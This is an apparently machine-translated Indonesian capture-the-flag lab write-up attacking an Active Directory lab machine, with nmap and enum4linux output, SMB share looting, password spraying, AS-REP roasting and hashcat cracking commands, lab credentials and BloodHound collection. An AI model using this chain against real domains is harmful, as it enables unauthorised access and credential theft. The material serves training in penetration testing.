---
title: "Mengatur ulang"
description: "Enumerasi Port 88 - Kerberos. Kita melihat bahwa port 88 terbuka, jadi mari kita lakukan enumerasi pada nama pengguna AD menggunakan kebrute. Kita juga melakukan enumerasi otomatis menggunakan enum4linux."
lang: "id"
translationKey: "reset"
category: "lab-writeups"
tags: ["Lab", "Active Directory", "Hard"]
publishDate: "2025-10-13"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "28b5fca1-ed80-802f-8d10-fac2a726c664"
notionUrl: "https://app.notion.com/p/Reset-28b5fca1ed80802f8d10fac2a726c664"
notionLastEdited: "2025-10-18T07:12:00.000Z"
---

# Enum

```javascript
# Command Nmap
nmap -sCV 10.10.17.230
# OUTPUT
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 23:15 WIB
Nmap scan report for 10.10.17.230
Host is up (0.41s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-13 16:16:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-13T16:16:36+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2025-10-12T16:09:06
|_Not valid after:  2026-04-13T16:09:06
|_ssl-date: 2025-10-13T16:17:15+00:00; +19s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 18s, deviation: 0s, median: 18s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-13T16:16:39
|_  start_date: N/A
```

## Port 88 - Kerberos

Kita melihat bahwa port 88 terbuka, jadi mari kita lakukan enumerasi pada nama pengguna pengguna AD menggunakan kebrute.

![](/images/reset/e389338b4179.png)

Kami juga melakukan enumerasi otomatis menggunakan enum4linux.

```javascript
❯ enum4linux -a 10.10.17.230
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 13 23:26:04 2025

 =========================================( Target Information )=========================================
                                                                                                                                                 
Target ........... 10.10.17.230                                                                                                                  
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.17.230 )============================
                                                                                                                                                 
                                                                                                                                                 
[E] Can't find workgroup/domain                                                                                                                  
                                                                                                                                                 
                                                                                                                                                 

 ================================( Nbtstat Information for 10.10.17.230 )================================
                                                                                                                                                 
Looking up status of 10.10.17.230                                                                                                                
No reply from 10.10.17.230

 ===================================( Session Check on 10.10.17.230 )===================================
                                                                                                                                                 
                                                                                                                                                 
[+] Server 10.10.17.230 allows sessions using username '', password ''                                                                           
                                                                                                                                                 
                                                                                                                                                 
 ================================( Getting domain SID for 10.10.17.230 )================================
                                                                                                                                                 
Domain Name: THM                                                                                                                                 
Domain Sid: S-1-5-21-1966530601-3185510712-10604624

[+] Host is part of a domain (not a workgroup)                                                                                                   
                                                                                                                                                 
                                                                                                                                                 
 ===================================( OS information on 10.10.17.230 )===================================
                                                                                                                                                 
                                                                                                                                                 
[E] Can't get OS info with smbclient                                                                                                             
                                                                                                                                                 
                                                                                                                                                 
[+] Got OS info for 10.10.17.230 from srvinfo:                                                                                                   
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                           


 =======================================( Users on 10.10.17.230 )=======================================
                                                                                                                                                 
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                          
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.


[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                              
                                                                                                                                                 
                                                                                                                                                 
 =================================( Share Enumeration on 10.10.17.230 )=================================
                                                                                                                                                 
do_connect: Connection to 10.10.17.230 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                          

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.17.230                                                                                                     
                                                                                                                                                 
                                                                                                                                                 
 ============================( Password Policy Information for 10.10.17.230 )============================
                                                                                                                                                 
                                                                                                                                                 
[E] Unexpected error from polenum:                                                                                                               
                                                                                                                                                 
                                                                                                                                                 

[+] Attaching to 10.10.17.230 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.17.230)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                 
                                                                                                                                                 
                                                                                                                                                 

 =======================================( Groups on 10.10.17.230 )=======================================
                                                                                                                                                 
                                                                                                                                                 
[+] Getting builtin groups:                                                                                                                      
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting builtin group memberships:                                                                                                          
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting local groups:                                                                                                                       
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting local group memberships:                                                                                                            
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting domain groups:                                                                                                                      
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting domain group memberships:                                                                                                           
                                                                                                                                                 
                                                                                                                                                 
 ==================( Users on 10.10.17.230 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                 
                                                                                                                                                 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                        
                                                                                                                                                 
                                                                                                                                                 
 ===============================( Getting printer info for 10.10.17.230 )===============================
                                                                                                                                                 
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                          


enum4linux complete on Mon Oct 13 23:27:43 2025

❯ enum4linux -u thm.corp\\guest -a 10.10.17.230
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 13 23:28:35 2025

 =========================================( Target Information )=========================================
                                                                                                                                                 
Target ........... 10.10.17.230                                                                                                                  
RID Range ........ 500-550,1000-1050
Username ......... 'thm.corp\guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.17.230 )============================
                                                                                                                                                 
                                                                                                                                                 
[E] Can't find workgroup/domain                                                                                                                  
                                                                                                                                                 
                                                                                                                                                 

 ================================( Nbtstat Information for 10.10.17.230 )================================
                                                                                                                                                 
Looking up status of 10.10.17.230                                                                                                                
No reply from 10.10.17.230

 ===================================( Session Check on 10.10.17.230 )===================================
                                                                                                                                                 
                                                                                                                                                 
[+] Server 10.10.17.230 allows sessions using username 'thm.corp\guest', password ''                                                             
                                                                                                                                                 
                                                                                                                                                 
 ================================( Getting domain SID for 10.10.17.230 )================================
                                                                                                                                                 
Domain Name: THM                                                                                                                                 
Domain Sid: S-1-5-21-1966530601-3185510712-10604624

[+] Host is part of a domain (not a workgroup)                                                                                                   
                                                                                                                                                 
                                                                                                                                                 
 ===================================( OS information on 10.10.17.230 )===================================
                                                                                                                                                 
                                                                                                                                                 
[E] Can't get OS info with smbclient                                                                                                             
                                                                                                                                                 
                                                                                                                                                 
[+] Got OS info for 10.10.17.230 from srvinfo:                                                                                                   
        10.10.17.230   Wk Sv PDC Tim NT                                                                                                          
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b


 =======================================( Users on 10.10.17.230 )=======================================
                                                                                                                                                 
                                                                                                                                                 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                             
                                                                                                                                                 
                                                                                                                                                 

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                              
                                                                                                                                                 
                                                                                                                                                 
 =================================( Share Enumeration on 10.10.17.230 )=================================
                                                                                                                                                 
do_connect: Connection to 10.10.17.230 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                          

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.17.230                                                                                                     
                                                                                                                                                 
//10.10.17.230/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                
//10.10.17.230/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.10.17.230/Data     Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                   
                                                                                                                                                 
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                
//10.10.17.230/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//10.10.17.230/NETLOGON Mapping: OK Listing: DENIED Writing: N/A
//10.10.17.230/SYSVOL   Mapping: OK Listing: DENIED Writing: N/A

 ============================( Password Policy Information for 10.10.17.230 )============================
                                                                                                                                                 
                                                                                                                                                 
[E] Unexpected error from polenum:                                                                                                               
                                                                                                                                                 
                                                                                                                                                 

[+] Attaching to 10.10.17.230 using thm.corp\guest

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.17.230)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                 
                                                                                                                                                 
                                                                                                                                                 

 =======================================( Groups on 10.10.17.230 )=======================================
                                                                                                                                                 
                                                                                                                                                 
[+] Getting builtin groups:                                                                                                                      
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting builtin group memberships:                                                                                                          
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting local groups:                                                                                                                       
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting local group memberships:                                                                                                            
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting domain groups:                                                                                                                      
                                                                                                                                                 
                                                                                                                                                 
[+]  Getting domain group memberships:                                                                                                           
                                                                                                                                                 
                                                                                                                                                 
 ==================( Users on 10.10.17.230 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                 
                                                                                                                                                 
[I] Found new SID:                                                                                                                               
S-1-5-21-1966530601-3185510712-10604624                                                                                                          

[I] Found new SID:                                                                                                                               
S-1-5-21-1966530601-3185510712-10604624                                                                                                          

[I] Found new SID:                                                                                                                               
S-1-5-32                                                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-32                                                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-32                                                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-32                                                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-32                                                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-32                                                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-32                                                                                                                                         

[I] Found new SID:                                                                                                                               
S-1-5-21-1966530601-3185510712-10604624                                                                                                          

[I] Found new SID:                                                                                                                               
S-1-5-21-1966530601-3185510712-10604624                                                                                                          

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'thm.corp\guest', password ''             
                                                                                                                                                 
                                                                                                                                                 
[+] Enumerating users using SID S-1-5-21-464380489-2612913341-2456039557 and logon username 'thm.corp\guest', password ''                        
                                                                                                                                                 
S-1-5-21-464380489-2612913341-2456039557-500 HAYSTACK\Administrator (Local User)                                                                 
S-1-5-21-464380489-2612913341-2456039557-501 HAYSTACK\Guest (Local User)
S-1-5-21-464380489-2612913341-2456039557-503 HAYSTACK\DefaultAccount (Local User)
S-1-5-21-464380489-2612913341-2456039557-504 HAYSTACK\WDAGUtilityAccount (Local User)
S-1-5-21-464380489-2612913341-2456039557-513 HAYSTACK\None (Domain Group)

[+] Enumerating users using SID S-1-5-90 and logon username 'thm.corp\guest', password ''                                                        
                                                                                                                                                 
                                                                                                                                                 
[+] Enumerating users using SID S-1-5-21-1966530601-3185510712-10604624 and logon username 'thm.corp\guest', password ''                         
                                                                                                                                                 
S-1-5-21-1966530601-3185510712-10604624-500 THM\Administrator (Local User)                                                                       
S-1-5-21-1966530601-3185510712-10604624-501 THM\Guest (Local User)
S-1-5-21-1966530601-3185510712-10604624-502 THM\krbtgt (Local User)
S-1-5-21-1966530601-3185510712-10604624-512 THM\Domain Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-513 THM\Domain Users (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-514 THM\Domain Guests (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-515 THM\Domain Computers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-516 THM\Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-517 THM\Cert Publishers (Local Group)
S-1-5-21-1966530601-3185510712-10604624-518 THM\Schema Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-519 THM\Enterprise Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-520 THM\Group Policy Creator Owners (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-521 THM\Read-only Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-522 THM\Cloneable Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-525 THM\Protected Users (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-526 THM\Key Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-527 THM\Enterprise Key Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-1008 THM\HAYSTACK$ (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username 'thm.corp\guest', password ''                                                        
                                                                                                                                                 
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 10.10.17.230 )===============================
                                                                                                                                                 
No printers returned.                                                                                                                            


enum4linux complete on Tue Oct 14 00:22:08 2025
```

Dari enum4linux, kami menemukan bahwa kami mendapatkan pengguna guest dan kami dapat mengakses folder bersama menggunakan nama pengguna tersebut, jadi saya ingin memastikannya menggunakan smbmap.

![](/images/reset/a90aefe18c52.png)

![](/images/reset/0c6e1bc4c82e.png)

## Port 139 & 445 - SMB

Lalu mari kita periksa isi folder bersama Data.

![](/images/reset/df6fac158ee4.png)

Nama filenya terus berubah, jadi mari kita ambil semuanya dengan cepat.

```javascript
smbclient \\\\10.10.200.60\\Data -U thm\\guest -c 'prompt OFF;recurse ON;cd 'onboarding';lcd '/home/kali/Documents/tryhackme';mget *'
```

![](/images/reset/974f9cd39205.png)

Sekarang periksa file satu per satu untuk melihat apa yang bisa kita dapatkan dari file-file tersebut.

Pada berkas ve3ojpb3.njv.pdf kami menemukan kemungkinan nama pengguna dan kata sandi.

![](/images/reset/e672aa4397a8.png)

Kami menemukan kemungkinan kata sandi yang sama pada file ia3s5y0v.ehj.txt

![](/images/reset/08666b469229.png)

sekarang mari kita semprotkan nama pengguna menggunakan impacket lookupsid

```javascript
impacket-lookupsid thm.corp/guest@10.10.200.60
```

Kami menemukan banyak nama pengguna yang dapat kami coba, tetapi seperti pada enumerasi sebelumnya, kami mendapatkan nama pengguna lily oneill, jadi mari kita coba dulu, karena kami juga mendapatkan nama pengguna tersebut di lookupsid.

![](/images/reset/8c4b49f8d4d8.png)

Kami menggunakan netexec untuk mencoba apakah pengguna memiliki akses ke beberapa server antarmuka seperti winrm, rdp, smb, dll. (LILY_ONEILL:Resetme123!)

![](/images/reset/fa18d9be67ab.png)

Lihat, kami hanya memiliki akses SMB menggunakan kredensial, lalu saat kami mengakses kembali folder bersama, kami hanya mendapatkan file yang sama di dalam folder tersebut.

![](/images/reset/e815974fe2bf.png)

Pada langkah sebelumnya kita telah mendapatkan sejumlah nama pengguna, jadi mari kita coba menggunakannya untuk serangan password spraying guna mendapatkan lebih banyak petunjuk tentang layanan tersebut. Kita mendapatkan banyak akses yang hanya tersedia di SMB dengan akun yang berbeda, tetapi saya tidak melihatnya di folder share yang berbeda, jadi mari kita beralih ke skenario lain.

![](/images/reset/eff5632216a7.png)

Karena kita memiliki kredensial yang valid, mari kita coba melakukan serangan AESREPRoasting, mungkin kita bisa mendapatkan sesuatu yang menarik.

```javascript
impacket-GetNPUsers thm.corp/ -format hashcat -usersfile usernames.txt -outputfile reset1
```

![](/images/reset/9250aaa615e9.png)

jadi mari kita coba memecahkannya menggunakan hashcat,

```javascript
hashcat -m 18200 reset1 /usr/share/wordlists/rockyou.txt
```

![](/images/reset/4d022a6ed159.png)

Yey, kita punya pengguna baru, jadi mari kita periksa lagi akses apa yang dimiliki pengguna ini. (`TABATHA_BRITT:marlboro(1985)`), yey, kita punya akses ke server melalui RDP atau WMI

![](/images/reset/cd8528eb2492.png)

Jadi, mari kita masuk ke server melalui RDP dan menjalankan Bloodhound untuk melakukan enumerasi di dalamnya.

![](/images/reset/1e1bff369e8a.png)

Kami melihat bahwa kami tidak dapat menjalankan Bloodhound dari dalam mesin, jadi kami mencoba menjalankannya dari luar.

```javascript
bloodhound-python -d thm.corp -u 'TABATHA_BRITT' -p 'marlboro(1985)' -c all -v --zip -ns 10.10.101.214
```

![](/images/reset/f94c81bac7e0.png)

Output dari Bloodhound: kita akan mendapatkan file seperti berikut ini.

![](/images/reset/994a012a7bb8.png)

Kemudian jalankan Bloodhound dan impor file zip untuk mendapatkan visualisasi grafis seperti berikut.
